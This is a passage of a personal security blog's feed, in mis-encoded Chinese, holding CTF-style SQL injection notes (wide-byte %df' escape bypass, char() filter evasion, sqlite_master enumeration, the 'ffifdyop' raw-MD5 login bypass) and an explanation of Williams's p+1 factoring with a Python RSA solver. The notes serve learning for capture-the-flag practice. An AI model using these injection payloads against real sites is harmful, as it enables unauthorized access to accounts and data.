title="é€šè¿‡RENAMEæ›´æ”¹flagæ‰€åœ¨è¡¨åä¸ºé»˜è®¤æŸ¥è¯¢çš„è¡¨å"></a>é€šè¿‡<code>RENAME</code>æ›´æ”¹flagæ‰€åœ¨è¡¨åä¸ºé»˜è®¤æŸ¥è¯¢çš„è¡¨å</h2><p>æ›´æ”¹è¡¨å:</p><blockquote><p><code>rename table tbl_name to new_tbl_name</code><br><code>alter table table_name to new name</code></p></blockquote><p>æ›´æ”¹åˆ—å</p><blockquote><p><code>alter table t_app change name app_name varchar(20)</code></p></blockquote><h2 id="ç»•è¿‡æ–¹æ³•"><a href="#ç»•è¿‡æ–¹æ³•" class="headerlink" title="ç»•è¿‡æ–¹æ³•"></a>ç»•è¿‡æ–¹æ³•</h2><h3 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h3><p>åˆ©ç”¨ç¼–ç è½¬æ¢, å°†æœåŠ¡å™¨ç«¯å¼ºåˆ¶æ·»åŠ çš„æœ¬æ¥ç”¨äºè½¬ä¹‰çš„\ç¬¦å·åƒæ‰, ä»è€Œèƒ½ä½¿æ”»å‡»è€…è¾“å…¥çš„å¼•å·èµ·åˆ°é—­åˆä½œç”¨, ä»¥è‡³äºå¯ä»¥è¿›è¡ŒSQLæ³¨å…¥.</p><h4 id="æ“ä½œ"><a href="#æ“ä½œ" class="headerlink" title="æ“ä½œ"></a>æ“ä½œ</h4><p>å¦‚åœ¨è¿›è¡Œ<code>url?id=1&#39;</code>ç­‰æ“ä½œæ—¶, å‘ç°æ— è®ºå¦‚ä½•éƒ½ä¸æŠ¥é”™, æˆ–è€…æŠ¥é”™äº†è«åå…¶å¦™çš„å¤šå‡ºäº†æœ‰, æ­¤æ—¶å°±å¯ä»¥ä½¿ç”¨<code>url?id=1%df&#39;</code>, è¿™æ—¶æœåŠ¡ç«¯ä¼šåœ¨â€™å‰é¢æ·»åŠ ä¸€ä¸ª, \çš„ASCIIç ä¸º0x5c, å› ä¸ºå‰é¢çš„%dfå¤§äº128, æœåŠ¡ç«¯ä¼šå°†0xdfå’Œ0x5cåˆå¹¶æˆ0xdf5cå³æ±‰å­— â€œè¿â€, ä»è€Œè¾¾åˆ°äº†ç»•è¿‡\è½¬ä¹‰â€™çš„ç›®çš„</p><h3 id="PHPé¢„å¤„ç†"><a href="#PHPé¢„å¤„ç†" class="headerlink" title="PHPé¢„å¤„ç†"></a>PHPé¢„å¤„ç†</h3><p>ä½¿ç”¨concat(char(num,num,num)) å³ä½¿ç”¨asciiç è½¬æˆå­—ç¬¦å†æ‹¼æ¥æ¥ç»•è¿‡å¯¹æŸäº›å…³é”®è¯çš„è¿‡æ»¤.</p><h1 id="SQLiteæ³¨å…¥"><a href="#SQLiteæ³¨å…¥" class="headerlink" title="SQLiteæ³¨å…¥"></a>SQLiteæ³¨å…¥</h1><p>ä¸sqlä¸åŒçš„æ˜¯, sqliteå°‘äº†ä¸€äº›å‡½æ•°, æ¯”å¦‚database()ç­‰ç­‰, è€Œä¸”å¦‚æœä½¿ç”¨äº†ä¸å­˜åœ¨çš„å‡½æ•°ä¹Ÿæ— æ³•çˆ†å‡ºåº“å.<br>ä½†æ˜¯sqliteå­˜åœ¨ä¸€ä¸ªsqlite_masterè¡¨, é‡Œé¢çš„å­—æ®µä¸ºtype/name/tbl_name/rootpage/sql<br>å¯ä»¥é€šè¿‡æŸ¥è¯¢è¯¥è¡¨å†…ä¿¡æ¯å¾—åˆ°è¡¨å, å¹¶ä¸”å¯ä»¥é€šè¿‡sqlå­—æ®µå†…çš„sqlè¯­å¥å¾—åˆ°å¯¹åº”è¡¨å†…çš„å­—æ®µ</p><h1 id="ä¸€äº›å¥‡æ€ªçš„æ€»ç»“"><a href="#ä¸€äº›å¥‡æ€ªçš„æ€»ç»“" class="headerlink" title="ä¸€äº›å¥‡æ€ªçš„æ€»ç»“???"></a>ä¸€äº›å¥‡æ€ªçš„æ€»ç»“???</h1><h2 id="jarvis-oj-login"><a href="#jarvis-oj-login" class="headerlink" title="jarvis oj - login"></a>jarvis oj - login</h2><p>è¿™æ˜¯ä¸€é“è¦ç”¨ä¸‡èƒ½å¯†ç ç™»å½•çš„é¢˜<br>sqlè¯­å¥æ˜¯:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;select * from &#96;admin&#96; where password&#x3D;&#39;&quot;.md5($pass,true).&quot;&#39;&quot;</span><br></pre></td></tr></table></figure><p>phpçš„md5()è¿™ä¸ªå‡½æ•°, å¯ä»¥æœ‰ç¬¬äºŒä¸ªå‚æ•°, å¦‚æœæ˜¯true, åˆ™å›è¿”å›åŸå§‹çš„äºŒè¿›åˆ¶æ•°æ®, ä¹Ÿå°±æ˜¯åŸæœ¬md5å‡ºæ¥çš„32ä½åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æˆçœŸæ­£çš„åå…­å­—èŠ‚çš„å­—ç¬¦ä¸².<br>é‚£ä¹ˆè¿™é‡Œè¦ç™»å½•è¿›å», éœ€è¦æŠŠè¯­å¥æ„é€ æˆ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;select * from &#96;admin&#96; where password&#x3D;&#39;&#39;or&#39;1&#39;&quot; </span><br><span class="line"># oråé¢çš„1å¯ä»¥æ¢æˆåˆ«çš„, åªè¦æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²å°±å¥½äº†</span><br></pre></td></tr></table></figure><p>ç„¶åè¿™é‡Œç”¨åˆ°äº†ä¸€ä¸ªå­—ç¬¦ä¸²<code>ffifdyop</code>, ä¸ºå•¥ç”¨è¿™ä¸ªå‘¢? å› ä¸º<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-794d608806ba4f49b52e2d5359f60040.png" alt="å›¾ç‰‡.png"><br>å¦‚æœ<code>$pass=ffifdyop</code>, é‚£ä¹ˆè¯­å¥å°±ä¼šå˜æˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;select * from &#96;admin&#96; where password&#x3D;&#39;&#39;or&#39;6&#39;&quot; </span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±èƒ½ç™»å½•å•¦</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ä¸€èˆ¬æ³¨å…¥&quot;&gt;&lt;a href=&quot;#ä¸€èˆ¬æ³¨å…¥&quot; class=&quot;headerlink&quot; title=&quot;ä¸€èˆ¬æ³¨å…¥&quot;&gt;&lt;/a&gt;ä¸€èˆ¬æ³¨å…¥&lt;/h2&gt;&lt;p&gt;é€šè¿‡ä¿®æ”¹å‚æ•°çš„å€¼, ä¾‹å¦‚&lt;strong&gt;æ­£å¸¸æ•°å­— å¤§æ•°å­— å­—ç¬¦ å•å¼•å· åŒå¼•å· æ‹¬å· åæ–œæ ç­‰ç­‰&lt;/strong&gt;æ¥æ¢æµ‹æ˜¯å¦</summary>
      
    
    
    
    <category term="WebSummary" scheme="http://tearsjin.github.io/categories/WebSummary/"/>
    
    
    <category term="Web" scheme="http://tearsjin.github.io/tags/Web/"/>
    
    <category term="Summary" scheme="http://tearsjin.github.io/tags/Summary/"/>
    
    <category term="SQL" scheme="http://tearsjin.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>Williams&#39;s p+1 algorithm</title>
    <link href="http://tearsjin.github.io/2020/09/26/Williams-s-p-1-algorithm/"/>
    <id>http://tearsjin.github.io/2020/09/26/Williams-s-p-1-algorithm/</id>
    <published>2020-09-26T02:33:58.000Z</published>
    <updated>2021-03-13T02:55:30.882Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨è®¡ç®—æ•°è®ºä¸­ï¼ŒWilliamsçš„p+1ç®—æ³•æ˜¯ä¸€ç§æ•´æ•°åˆ†è§£ç®—æ³•ï¼Œæ˜¯ä»£æ•°ç¾¤å› å­åˆ†è§£ç®—æ³•å®¶æ—ä¸­çš„ä¸€ç§ã€‚å®ƒæ˜¯Hugh C. Williamsåœ¨1982å¹´å‘æ˜çš„ã€‚<br>å¦‚æœè¦åˆ†è§£çš„æ•°NåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªç´ æ•°å› å­pï¼Œä¸”p+1æ˜¯å…‰æ»‘çš„(å³p+1åªåŒ…å«å°çš„å› å­)ï¼Œé‚£ä¹ˆWilliamsâ€™s p+1æœ‰æ•ˆã€‚<br>Williamsâ€™s p+1ä½¿ç”¨Lucasåºåˆ—åœ¨äºŒæ¬¡åŸŸä¸­æ‰§è¡Œæ±‚å¹‚è¿ç®—ã€‚</p><p>å®ƒç±»ä¼¼äºPollardçš„pâˆ’1ç®—æ³•ã€‚</p><h2 id="ç®—æ³•åŸç†"><a href="#ç®—æ³•åŸç†" class="headerlink" title="ç®—æ³•åŸç†"></a>ç®—æ³•åŸç†</h2><p>é€‰æ‹©ä¸€ä¸ªå¤§äº2çš„æ•´æ•°Aæ¥è®¡ç®—Lucasåºåˆ—:<br>$$ V_0 = 2,V_1 = A $$<br>$$ V_j = AV_{j-1}-V_{j-2} $$<br><strong>å…¶ä¸­æ‰€æœ‰çš„è¿ç®—éƒ½æ˜¯æ¨¡Nçš„</strong></p><p>å½“Mæ˜¯$p-(D/p)$çš„å€æ•°æ—¶ï¼Œå¥‡ç´ æ•°pæ•´é™¤$gcd(N,V_M-2)$ï¼Œ</p><blockquote><p>$D=A^2-4$<br>$(D/P)$æ˜¯jacobi symbol</p></blockquote><p>æˆ‘ä»¬è¦æ±‚$(D/p)=-1$ï¼Œå³Dåº”è¯¥æ˜¯ä¸€ä¸ªæ¨¡pçš„äºŒæ¬¡çš„éå‰©ä½™ï¼Œä½†æ˜¯ç”±äºæˆ‘ä»¬ä¸çŸ¥é“pï¼Œæ‰€ä»¥åœ¨æ‰¾åˆ°è§£ä¹‹å‰å¯èƒ½éœ€è¦ä¸€ä¸ªä»¥ä¸Šçš„Aå€¼ã€‚($D=A^2-4$)</p><p>å¦‚æœ$(D/p)=+1$ï¼Œåˆ™è¯¥ç®—æ³•é€€åŒ–ä¸ºPollardçš„pâˆ’1ç®—æ³•çš„æ…¢ç‰ˆæœ¬ã€‚</p><p>å› æ­¤ï¼Œå¯¹äºä¸åŒçš„Må€¼ï¼Œæˆ‘ä»¬è®¡ç®— $gcd(N,V_{M-2})$ ï¼Œå½“ç»“æœä¸ç­‰äº1æˆ–Næ—¶ï¼Œæˆ‘ä»¬ä¾¿æ‰¾åˆ°äº†Nçš„ä¸€ä¸ªéå¹³å‡¡å› å­ã€‚</p><p>ä½¿ç”¨çš„Må€¼æ˜¯è¿ç»­çš„é˜¶ä¹˜ï¼Œè€Œ $V_M$ æ˜¯ä»¥ $V_{M-1}$ ä¸ºç‰¹å¾çš„åºåˆ—çš„ç¬¬Mä¸ªå€¼</p><p>ä¸ºäº†æ‰¾åˆ°ä»¥Bä¸ºç‰¹å¾çš„åºåˆ—çš„ç¬¬Mä¸ªå…ƒç´ Vï¼Œæˆ‘ä»¬ä»¥ç±»ä¼¼äºä»å·¦åˆ°å³æ±‚å¹‚çš„æ–¹å¼è¿›è¡Œè®¡ç®—:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">x :&#x3D; B</span><br><span class="line">y :&#x3D; ( B ^ 2 - 2 ) MOD N</span><br><span class="line">for each bit of M to the right of the most significant bit do</span><br><span class="line">if the bit is 1 then</span><br><span class="line">x :&#x3D; ( x * y - B ) MOD N</span><br><span class="line">y :&#x3D; ( y ^ 2 - 2 ) MOD N</span><br><span class="line">else</span><br><span class="line">y :&#x3D; ( x ^ y - B ) MOD N</span><br><span class="line">x :&#x3D; ( x ^ 2 - 2 ) MOD N</span><br><span class="line">V :&#x3D; x</span><br></pre></td></tr></table></figure><h2 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h2><p>ä»¤n = 112729ï¼ŒA = 5ï¼Œæ±‚å¾—çš„$V_M$çš„è¿ç»­å€¼ä¸º:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">V1 of seq(5) &#x3D; V1! of seq(5) &#x3D; 5</span><br><span class="line">V2 of seq(V1) &#x3D; V2! of seq(5) &#x3D; 23</span><br><span class="line">V3 of seq(V2) &#x3D; V3! of seq(5) &#x3D; 12098</span><br><span class="line">V4 of seq(V3) &#x3D; V4! of seq(5) &#x3D; 87680</span><br><span class="line">V5 of seq(V4) &#x3D; V5! of seq(5) &#x3D; 53242</span><br><span class="line">V6 of seq(V5) &#x3D; V6! of seq(5) &#x3D; 27666</span><br><span class="line">V7 of seq(V6) &#x3D; V7! of seq(5) &#x3D; 110229</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œ$gcd(110229-2,112729) = 139$ï¼Œæ‰€ä»¥139 æ˜¯112729çš„ä¸€ä¸ªéå¹³å‡¡ç´ å› å­ã€‚<br>æ³¨æ„åˆ° $p+1 = 140 = 2^2 * 5 * 7$ã€‚è€Œ $7!$ æ˜¯æœ€å°çš„æ˜¯140çš„å€æ•°çš„é˜¶ä¹˜æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªåˆé€‚çš„å› å­139ã€‚</p><h2 id="ä¾‹é¢˜-V-amp-N2020-å…¬å¼€èµ›-easy-RSA"><a href="#ä¾‹é¢˜-V-amp-N2020-å…¬å¼€èµ›-easy-RSA" class="headerlink" title="ä¾‹é¢˜ [V&amp;N2020 å…¬å¼€èµ›]easy_RSA"></a>ä¾‹é¢˜ [V&amp;N2020 å…¬å¼€èµ›]easy_RSA</h2><p>å°±æ˜¯å› ä¸ºè¿™é¢˜ï¼Œæ‰ä¼šæƒ³åˆ°Williamsâ€™s p+1<br>å®¡è®¡ä»£ç å‘ç°n = q<em>p</em>r ä¸­ä¸‰ä¸ªå› å­éƒ½æ˜¯p+1å…‰æ»‘çš„æ‰€ä»¥æƒ³åˆ°Williamsâ€™s p+1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="number">7941371739956577280160664419383740967516918938781306610817149744988379280561359039016508679365806108722198157199058807892703837558280678711420411242914059658055366348123106473335186505617418956630780649894945233345985279471106888635177256011468979083320605103256178446993230320443790240285158260236926519042413378204298514714890725325831769281505530787739922007367026883959544239568886349070557272869042275528961483412544495589811933856131557221673534170105409</span></span><br><span class="line">A = [<span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">13</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">seq</span>(<span class="params">t, base, n</span>):</span></span><br><span class="line">    x = <span class="number">2</span></span><br><span class="line">    y = base</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x, y = y, (base * y - x) % n</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i == t:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">fac = []</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> A:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5000</span>):</span><br><span class="line">        v = seq(i, v, n)</span><br><span class="line">        p = gmpy2.gcd(v - <span class="number">2</span>, n)</span><br><span class="line">        print(i,p)</span><br><span class="line">        <span class="keyword">if</span> p != <span class="number">1</span>:</span><br><span class="line">            fac.append(p)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(fac) != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>å½“ç¨‹åºåœ¨A = 5 , i = 2391æ—¶<br>å°±è·‘å‡ºäº†å…¶ä¸­ä¸€ä¸ªå› å­ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">102634610559478918970860957918259981057327949366949344137104804864768237961662136189827166317524151288799657758536256924609797810164397005081733039415393</span><br></pre></td></tr></table></figure><p>ç„¶åç”¨né™¤ä»¥è¿™ä¸ªå› å­å¹¶å¯¹å¾—æ•°ç»§ç»­Williamsâ€™s p+1ä¾¿å¯ä»¥åˆ†è§£å‡ºå‰©ä¸‹çš„ä¸¤ä¸ªå› å­</p><blockquote><p>wikiæ²¡æœ‰ä¸­æ–‡å¯çœŸæ˜¯å¤´å¤§(åŸç†å’Œä¾‹å­å…¶å®å°±æ˜¯è‹±æ–‡wikiä¸ŠWilliamsâ€™s p+1çš„æ‘˜æŠ„+ç¿»è¯‘å•¦</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;åœ¨è®¡ç®—æ•°è®ºä¸­ï¼ŒWilliamsçš„p+1ç®—æ³•æ˜¯ä¸€ç§æ•´æ•°åˆ†è§£ç®—æ³•ï¼Œæ˜¯ä»£æ•°ç¾¤å› å­åˆ†è§£ç®—æ³•å®¶æ—ä¸­çš„ä¸€ç§ã€‚å®ƒæ˜¯Hugh C. Williamsåœ¨1982å¹´å‘æ˜çš„ã€‚&lt;br&gt;å¦‚æœè¦åˆ†è§£çš„æ•°NåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªç´ æ•°å› å­pï¼Œä¸”p+1æ˜¯å…‰æ»‘çš„(å³p+1åªåŒ…å«å°çš„å› å­)ï¼Œé‚£ä¹ˆWilliamsâ€™s p</summary>
      
    
    
    
    <category term="Algorithm" scheme="http://tearsjin.github.io/categories/Algorithm/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="Algorithm" scheme="http://tearsjin.github.io/tags/Algorithm/"/>
    
  </entry>
  
</feed>
